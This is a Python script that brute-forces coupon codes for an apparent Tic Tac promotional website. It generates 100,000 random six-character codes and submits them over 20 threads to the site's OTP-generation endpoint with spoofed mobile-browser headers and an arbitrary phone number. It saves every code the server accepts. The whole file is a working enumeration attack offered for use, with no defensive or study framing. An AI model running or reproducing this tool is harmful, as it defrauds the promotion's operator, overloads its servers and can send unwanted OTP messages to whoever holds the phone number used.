import requests
import random
import string
import time
import json
import threading
from concurrent.futures import ThreadPoolExecutor
import os
import sys
from datetime import datetime

# Fix Windows encoding issue
if sys.platform == 'win32':
    try:
        import codecs
        import io
        # Set UTF-8 for console output
        if hasattr(sys.stdout, 'buffer'):
            sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
            sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
    except:
        pass
    # Set console code page to UTF-8
    try:
        os.system('chcp 65001 >nul 2>&1')
    except:
        pass

REAL_PHONE = "9876543741"          #Add any random 10 digit number or remain same 
NUM_THREADS = 20
NUM_CODES_TO_TRY = 100000         
DELAY_PER_REQUEST = 0.5
START_WITH_D = True
SAVE_FILE = "VALID_TICTAC_COUPONS_LIVE.txt"

BASE_URL = "https://jarpecarpromo.tictac.com"
REGISTER_URL = f"{BASE_URL}/in/en/xp/jarpecarpromo/home/register"
OTP_URL = f"{BASE_URL}/in/en/xp/jarpecarpromo/home/generateOTP/"


HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.116 Mobile Safari/537.36',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Referer': REGISTER_URL,
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': BASE_URL,
    'Connection': 'keep-alive',
}


class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


total_checked = 0
valid_found = 0
stats_lock = threading.Lock()
file_lock = threading.Lock()


def save_valid_coupon(code):
    with file_lock:
        try:
            with open(SAVE_FILE, "a", encoding='utf-8') as f:
                f.write(code + "\n")
                f.flush()
        except Exception as e:
            print(f"\n{Colors.FAIL}Error saving code: {e}{Colors.ENDC}")

def generate_coupon():
    chars = string.ascii_uppercase + string.digits
    prefix = random.choice(['M', 'T']) if START_WITH_D else random.choice(string.ascii_uppercase)
    return prefix + ''.join(random.choice(chars) for _ in range(5))


def check_coupon(code, session, phone):
    data = {'phone': phone, 'ccode': code}
    try:
        response = session.post(OTP_URL, data=data, headers=HEADERS, timeout=15)
        if response.status_code != 200:
            return False, "Server error"

        try:
            result = response.json()
        except:
            return False, "Bad response"

        status = result.get('status')
        if status == 'success':
            return True, "VALID - OTP SENT!"
        else:
            return False, "Invalid"

    except requests.exceptions.Timeout:
        return False, "Timeout"
    except requests.exceptions.RequestException:
        return False, "Network error"
    except Exception:
        return False, "Error"

def worker(thread_id, codes_to_check, phone):
    global total_checked, valid_found
    session = requests.Session()
    session.headers.update(HEADERS)
    try:
        session.get(REGISTER_URL, timeout=15)
    except:
        pass

    for code in codes_to_check:
        with stats_lock:
            total_checked += 1

        print(f"{Colors.OKBLUE}[Thread {thread_id:2d}]{Colors.ENDC} Testing → {Colors.BOLD}{code}{Colors.ENDC}", end="", flush=True)

        is_valid, msg = check_coupon(code, session, phone)

        if is_valid:
            with stats_lock:
                valid_found += 1
            print(f"  →  {Colors.OKGREEN}✓ {msg}{Colors.ENDC}", flush=True)
            save_valid_coupon(code)
            print(f"{Colors.OKGREEN}{Colors.BOLD}╔══════════════════════════════════════════╗{Colors.ENDC}", flush=True)
            print(f"{Colors.OKGREEN}{Colors.BOLD}║        🎉 VALID CODE FOUND! 🎉           ║{Colors.ENDC}", flush=True)
            print(f"{Colors.OKGREEN}{Colors.BOLD}║        Code: {code:>6}                         ║{Colors.ENDC}", flush=True)
            print(f"{Colors.OKGREEN}{Colors.BOLD}║        Saved to {SAVE_FILE}       ║{Colors.ENDC}", flush=True)
            print(f"{Colors.OKGREEN}{Colors.BOLD}╚══════════════════════════════════════════╝{Colors.ENDC}\n", flush=True)
        else:
            print(f"  →  {Colors.FAIL}✗ {msg}{Colors.ENDC}", flush=True)

        time.sleep(DELAY_PER_REQUEST)


def print_status():
    while not stop_event.is_set():
        with stats_lock:
            checked = total_checked
            found = valid_found
        rate = checked / max(1, (time.time() - start_time)) if 'start_time' in globals() else 0
        print(f"\r{Colors.OKCYAN}Checked: {checked:,} | Valid: {found} | Speed: {rate:.1f} codes/sec{Colors.ENDC}", end="", flush=True)
        time.sleep(0.5)
    print("\r" + " " * 80 + "\r", end="")  


stop_event = threading.Event()

def main():
    global start_time
    os.system('cls' if os.name == 'nt' else 'clear')  

    print(f"""
{Colors.HEADER}{Colors.BOLD}
   ████████╗██╗ ██████╗    ████████╗ █████╗  ██████╗
   ╚══██╔══╝██║██╔════╝    ╚══██╔══╝██╔══██╗██╔════╝
      ██║   ██║██║            ██║   ███████║██║     
      ██║   ██║██║            ██║   ██╔══██║██║     
      ██║   ██║╚██████╗       ██║   ██║  ██║╚██████╗
      ╚═╝   ╚═╝ ╚═════╝       ╚═╝   ╚═╝  ╚═╝ ╚═════╝
""")

    print(f"{Colors.OKCYAN}┌{'─'*60}┐{Colors.ENDC}")
    print(f"{Colors.OKCYAN}│{Colors.ENDC} Phone Number      : {Colors.BOLD}{REAL_PHONE}{Colors.ENDC}{' '*(40-len(REAL_PHONE))} {Colors.OKCYAN}│{Colors.ENDC}")
    print(f"{Colors.OKCYAN}│{Colors.ENDC} Threads           : {Colors.BOLD}{NUM_THREADS}{Colors.ENDC}{' '*40} {Colors.OKCYAN}│{Colors.ENDC}")
    print(f"{Colors.OKCYAN}│{Colors.ENDC} Total Codes       : {Colors.BOLD}{NUM_CODES_TO_TRY:,}{Colors.ENDC}{' '*34} {Colors.OKCYAN}│{Colors.ENDC}")
    print(f"{Colors.OKCYAN}│{Colors.ENDC} Delay per Request : {Colors.BOLD}{DELAY_PER_REQUEST}s{Colors.ENDC}{' '*37} {Colors.OKCYAN}│{Colors.ENDC}")
    print(f"{Colors.OKCYAN}│{Colors.ENDC} Save File         : {Colors.BOLD}{SAVE_FILE}{Colors.ENDC}{' '*(40-len(SAVE_FILE))} {Colors.OKCYAN}│{Colors.ENDC}")
    print(f"{Colors.OKCYAN}└{'─'*60}┘{Colors.ENDC}\n")

    if os.path.exists(SAVE_FILE):
        os.remove(SAVE_FILE)
    open(SAVE_FILE, 'w').close()
    print(f"{Colors.OKGREEN}✓ Fresh save file created: {SAVE_FILE}{Colors.ENDC}\n")

    # Auto-start (comment out if you want manual start)
    # input(f"{Colors.WARNING}Press ENTER to start scanning...{Colors.ENDC}")
    print(f"{Colors.OKGREEN}Starting automatically...{Colors.ENDC}\n")

    
    all_codes = [generate_coupon() for _ in range(NUM_CODES_TO_TRY)]
    chunk_size = max(1, NUM_CODES_TO_TRY // NUM_THREADS)
    code_chunks = [all_codes[i:i + chunk_size] for i in range(0, NUM_CODES_TO_TRY, chunk_size)]

    start_time = time.time()

    
    status_thread = threading.Thread(target=print_status, daemon=True)
    status_thread.start()

    print(f"{Colors.OKGREEN}Starting {NUM_THREADS} threads... LET'S GO! 🚀{Colors.ENDC}\n")

    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = [executor.submit(worker, i+1, chunk, REAL_PHONE) for i, chunk in enumerate(code_chunks) if chunk]

        try:
            for future in futures:
                future.result()
        except KeyboardInterrupt:
            print(f"\n{Colors.FAIL}Stopping threads...{Colors.ENDC}")
            stop_event.set()

    stop_event.set()
    status_thread.join(timeout=1)

    elapsed = time.time() - start_time
    rate = total_checked / elapsed if elapsed > 0 else 0

    print(f"\n{Colors.HEADER}{Colors.BOLD}╔{'═'*50}╗{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}║                SCAN COMPLETE                  ║{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}╚{'═'*50}╝{Colors.ENDC}")
    print(f"{Colors.OKCYAN}Total Checked : {total_checked:,}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}Valid Found   : {valid_found}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Time Taken    : {elapsed:.1f}s{Colors.ENDC}")
    print(f"{Colors.WARNING}Average Speed : {rate:.1f} codes/sec{Colors.ENDC}")
    print(f"{Colors.OKGREEN}Check file    → {SAVE_FILE}{Colors.ENDC}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.FAIL}Script terminated by user.{Colors.ENDC}")
        sys.exit(0)
